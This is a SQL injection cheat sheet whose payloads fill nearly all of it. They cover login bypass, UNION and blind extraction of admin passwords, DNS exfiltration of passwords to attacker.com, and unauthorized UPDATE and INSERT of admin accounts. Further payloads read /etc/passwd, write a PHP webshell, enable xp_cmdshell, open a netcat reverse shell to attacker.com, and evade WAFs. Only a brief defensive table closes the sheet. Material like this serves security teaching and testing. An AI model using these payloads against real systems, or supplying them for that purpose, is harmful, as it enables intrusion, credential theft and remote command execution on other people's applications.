## 1. Authentication Bypass (Logging in without credentials)

The classic "always true" manipulation:

**Original query:**
```sql
SELECT * FROM users WHERE username = 'john' AND password = 'hash123'
```

**Injected username:**
```
' OR '1'='1
```

**Resulting query:**
```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'anything'
```

Since `'1'='1'` is always true, the query returns the first user (often an admin).

**Variations:**
```sql
admin' --
admin' #
' OR 1=1; --
admin' OR '1'='1' --
```

## 2. Data Extraction via UNION Attacks

Used when the original query returns results that the application displays (e.g., product listings, search results).

**Goal:** Retrieve data from tables not originally queried.

**Steps:**

1. **Determine number of columns:**
```sql
' ORDER BY 1 --
' ORDER BY 5 --
' UNION SELECT NULL, NULL, NULL --
```
Increase until error stops → that's the column count.

2. **Find displayable columns:**
```sql
' UNION SELECT 'A', NULL, NULL --
' UNION SELECT NULL, 'B', NULL --
```
Where 'A' or 'B' appears in output → that column is usable.

3. **Extract real data:**
```sql
' UNION SELECT username, password, NULL FROM users --
```

**Real-world example (retrieving multiple rows):**
```sql
' UNION SELECT table_name, NULL FROM information_schema.tables --
' UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name='users' --
```

## 3. Database Fingerprinting (Identifying the DBMS)

Different databases have unique functions and system tables.

| DBMS | Version query | System table |
|------|---------------|---------------|
| **MySQL** | `SELECT @@version` | `information_schema.tables` |
| **PostgreSQL** | `SELECT version()` | `information_schema.tables` |
| **SQL Server** | `SELECT @@VERSION` | `sysobjects` or `information_schema` |
| **Oracle** | `SELECT banner FROM v$version` | `all_tables` |

**Example injection:**
```sql
' UNION SELECT @@version, NULL --
' AND @@version LIKE '%MariaDB%' --
```

## 4. Boolean-Based Blind SQL Injection

When the application shows **different behavior** (e.g., "Welcome back" vs. "Access denied") but no actual data is returned.

**Test for vulnerability:**
```sql
' AND 1=1 --   (page loads normally)
' AND 1=2 --   (page changes or shows error)
```

**Extracting data character by character:**
```sql
-- Is the first character of the admin password 'a'?
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1) = 'a' --

-- With ASCII for case sensitivity:
' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)) > 96 --
```

**Automation required** (Burp Intruder, sqlmap, or custom script).

## 5. Time-Based Blind SQL Injection

Used when no visible difference exists between true/false conditions—only response time changes.

**MySQL:**
```sql
' AND IF(1=1, SLEEP(5), 0) --   (waits 5 seconds)
' AND IF(1=2, SLEEP(5), 0) --   (instant)
```

**Extracting data with delays:**
```sql
-- If first password char is 'a', wait 5 seconds
' AND IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)) = 97, SLEEP(5), 0) --
```

**PostgreSQL:**
```sql
' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END --
```

**SQL Server:**
```sql
'; WAITFOR DELAY '0:0:5' --
```

## 6. Out-of-Band (OOB) Data Exfiltration

Used when:
- No visible output
- No boolean difference
- No time-based allowed
- But outbound network requests are possible

**MySQL (DNS exfiltration):**
```sql
' SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\test')) --
```

**SQL Server (xp_dirtree):**
```sql
'; DECLARE @h VARCHAR(8000); SELECT @h = (SELECT TOP 1 password FROM users); EXEC xp_dirtree '\\' + @h + '.attacker.com\share' --
```

Attacker listens on DNS server → receives password in subdomain.

## 7. Privilege Escalation & Data Modification

**Change another user's password:**
```sql
'; UPDATE users SET password = 'newhash' WHERE username = 'admin' --
```

**Grant admin privileges:**
```sql
'; UPDATE users SET is_admin = 1 WHERE username = 'john' --
```

**Insert a new admin user (if not exists):**
```sql
'; INSERT INTO users (username, password, role) VALUES ('hacker', 'hash123', 'admin') --
```

## 8. File System Operations (MySQL)

**Read files (requires FILE privilege):**
```sql
' UNION SELECT LOAD_FILE('/etc/passwd'), NULL --
' UNION SELECT LOAD_FILE('C:\\windows\\win.ini'), NULL --
```

**Write webshell:**
```sql
' UNION SELECT "<?php system($_GET['cmd']); ?>", NULL INTO OUTFILE '/var/www/html/shell.php' --
```

## 9. Command Execution (Advanced)

**SQL Server (xp_cmdshell – often disabled but can be re-enabled):**
```sql
-- Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Execute OS command
'; EXEC xp_cmdshell 'whoami' --
```

**PostgreSQL (copy to program):**
```sql
'; COPY (SELECT 'malicious') TO PROGRAM 'nc attacker.com 4444 -e /bin/bash' --
```

## 10. Second-Order SQL Injection

The malicious payload is **stored** (e.g., registration form) and **executed later** when that stored data is used unsafely.

**Example:**
1. Register username: `admin' --`
2. System stores it safely (using parameterized query)
3. Later, an admin views user list with concatenation:
   ```sql
   SELECT * FROM users WHERE username = '$stored_username'
   ```
4. Payload activates on retrieval, not on storage.

## Quick Reference: Attack Classification by Goal

| Goal | Technique | Example |
|------|-----------|---------|
| **Login without password** | Authentication bypass | `' OR 1=1 --` |
| **Dump table data** | UNION injection | `' UNION SELECT * FROM users --` |
| **Discover table names** | Schema extraction | `' UNION SELECT table_name FROM information_schema.tables --` |
| **Extract data without output** | Boolean blind | `' AND (SELECT password FROM users LIMIT 1) LIKE 'a%' --` |
| **Extract with no feedback** | Time blind | `' AND IF(1=1, SLEEP(5), 0) --` |
| **Bypass commenting restrictions** | No-comment injection | `' OR 'x'='x` (no `--` needed) |
| **WAF evasion** | Encoding/case switching | `'/**/OR/**/1=1/**/#` |

## Defensive Takeaways

| Attack Type | Defense |
|-------------|---------|
| All injection | **Parameterized queries (prepared statements)** |
| UNION | Validate expected number/type of columns |
| Boolean/Time blind | Same as above + query timeouts |
| OOB exfiltration | Restrict outbound DB network access |
| File read/write | Run DB with least privilege (no FILE_PRIV) |
| xp_cmdshell | Disable dangerous stored procedures |
